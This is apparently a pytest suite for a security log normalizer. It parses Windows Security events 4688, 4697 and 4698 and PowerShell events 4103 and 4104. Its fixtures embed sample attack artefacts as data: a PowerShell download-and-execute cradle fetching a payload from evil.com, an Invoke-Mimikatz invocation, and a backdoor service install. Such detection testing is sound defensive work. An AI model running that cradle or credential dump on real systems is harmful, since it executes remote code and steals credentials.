"""Unit tests for Windows Security and PowerShell normalizers."""

import pytest
from app.models.events import EventCategory
from app.normalization.security import SecurityNormalizer, parse_hex_or_dec_int
from app.normalization.powershell import PowerShellNormalizer


class TestHexOrDecIntParser:
    def test_hex_conversion(self):
        assert parse_hex_or_dec_int("0x1f4") == 500
        assert parse_hex_or_dec_int("0X1E0") == 480
        assert parse_hex_or_dec_int("0x4") == 4

    def test_decimal_conversion(self):
        assert parse_hex_or_dec_int("500") == 500
        assert parse_hex_or_dec_int("4") == 4
        assert parse_hex_or_dec_int(1024) == 1024

    def test_invalid_and_empty_inputs(self):
        assert parse_hex_or_dec_int(None) is None
        assert parse_hex_or_dec_int("") is None
        assert parse_hex_or_dec_int("-") is None
        assert parse_hex_or_dec_int("invalid_string_zzz") is None


class TestSecurityNormalizer:
    @pytest.fixture
    def normalizer(self):
        return SecurityNormalizer()

    def test_security_eid4688_process_create_with_hex_pids(self, normalizer):
        system_fields = {
            "Provider": "Microsoft-Windows-Security-Auditing",
            "EventID": "4688",
            "EventRecordID": "9876",
            "TimeCreated": "2023-04-10T14:22:15.1234567Z",
            "Computer": "DC01.CORP.LOCAL",
            "Channel": "Security",
        }
        data_fields = {
            "SubjectUserName": "Administrator",
            "SubjectLogonId": "0x3e7",
            "NewProcessId": "0x1f4",  # 500
            "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c echo hello",
            "ProcessId": "0x1e0",  # 480
            "ParentProcessName": "C:\\Windows\\explorer.exe",
        }
        raw = "<Event>Security4688</Event>"

        event = normalizer.normalize(system_fields, data_fields, raw)

        assert event.event_id == 4688
        assert event.event_category == EventCategory.SECURITY
        assert event.event_type == "process_create"
        assert event.image == "C:\\Windows\\System32\\cmd.exe"
        assert event.command_line == "cmd.exe /c echo hello"
        assert event.process_id == 500
        assert event.parent_process_id == 480
        assert event.parent_image == "C:\\Windows\\explorer.exe"
        assert event.user == "Administrator"
        assert event.logon_id == "0x3e7"
        assert not event.is_quarantined

    def test_security_eid4697_service_install(self, normalizer):
        system_fields = {
            "Provider": "Microsoft-Windows-Security-Auditing",
            "EventID": "4697",
            "TimeCreated": "2023-04-10T14:22:16Z",
            "Computer": "SERVER01",
            "Channel": "Security",
        }
        data_fields = {
            "SubjectUserName": "SYSTEM",
            "ServiceName": "MaliciousBackdoorSvc",
            "ServiceFileName": "C:\\Windows\\Temp\\backdoor.exe",
            "ServiceType": "0x10",
            "ServiceStartType": "2",
        }
        raw = "<Event>Security4697</Event>"

        event = normalizer.normalize(system_fields, data_fields, raw)

        assert event.event_id == 4697
        assert event.event_category == EventCategory.SECURITY
        assert event.event_type == "service_install"
        assert event.service_name == "MaliciousBackdoorSvc"
        assert event.service_file_name == "C:\\Windows\\Temp\\backdoor.exe"
        assert event.user == "SYSTEM"
        assert event.extra_fields.get("ServiceType") == "0x10"

    def test_security_eid4698_task_create(self, normalizer):
        system_fields = {
            "Provider": "Microsoft-Windows-Security-Auditing",
            "EventID": "4698",
            "TimeCreated": "2023-04-10T14:22:17Z",
            "Computer": "SERVER01",
            "Channel": "Security",
        }
        task_xml = "<Task version='1.2'><Actions><Exec><Command>powershell.exe</Command></Exec></Actions></Task>"
        data_fields = {
            "SubjectUserName": "admin_svc",
            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\FakeTask",
            "TaskContent": task_xml,
        }
        raw = "<Event>Security4698</Event>"

        event = normalizer.normalize(system_fields, data_fields, raw)

        assert event.event_id == 4698
        assert event.event_category == EventCategory.SECURITY
        assert event.event_type == "task_create"
        assert event.task_name == "\\Microsoft\\Windows\\UpdateOrchestrator\\FakeTask"
        assert event.task_content == task_xml
        assert event.user == "admin_svc"


class TestPowerShellNormalizer:
    @pytest.fixture
    def normalizer(self):
        return PowerShellNormalizer()

    def test_powershell_eid4103_pipeline_execution(self, normalizer):
        system_fields = {
            "Provider": "Microsoft-Windows-PowerShell",
            "EventID": "4103",
            "TimeCreated": "2023-04-10T14:22:18Z",
            "Computer": "WORKSTATION02",
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "ProcessID": "3456",
        }
        data_fields = {
            "ContextInfo": "Severity = Informational\nHostName = ConsoleHost",
            "Payload": "CommandInvocation(Invoke-Mimikatz): \"Invoke-Mimikatz\"",
            "UserId": "DOMAIN\\user1",
        }
        raw = "<Event>PS4103</Event>"

        event = normalizer.normalize(system_fields, data_fields, raw)

        assert event.event_id == 4103
        assert event.event_category == EventCategory.POWERSHELL
        assert event.event_type == "pipeline_execute"
        assert event.process_id == 3456
        assert event.user == "DOMAIN\\user1"
        assert "Severity = Informational" in event.extra_fields.get("ContextInfo", "")
        assert "Invoke-Mimikatz" in event.extra_fields.get("Payload", "")

    def test_powershell_eid4104_script_block(self, normalizer):
        system_fields = {
            "Provider": "Microsoft-Windows-PowerShell",
            "EventID": "4104",
            "TimeCreated": "2023-04-10T14:22:19Z",
            "Computer": "WORKSTATION02",
            "Channel": "Microsoft-Windows-PowerShell/Operational",
        }
        data_fields = {
            "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
            "ScriptBlockId": "12345678-abcd-ef01-2345-6789abcdef01",
            "Path": "C:\\Users\\victim\\Documents\\run.ps1",
            "MessageNumber": "1",
            "MessageTotal": "1",
        }
        raw = "<Event>PS4104</Event>"

        event = normalizer.normalize(system_fields, data_fields, raw)

        assert event.event_id == 4104
        assert event.event_category == EventCategory.POWERSHELL
        assert event.event_type == "script_block"
        assert "DownloadString" in event.script_block_text
        assert event.script_block_id == "12345678-abcd-ef01-2345-6789abcdef01"
        assert event.script_path == "C:\\Users\\victim\\Documents\\run.ps1"
        assert event.extra_fields.get("MessageNumber") == "1"
        assert not event.is_quarantined
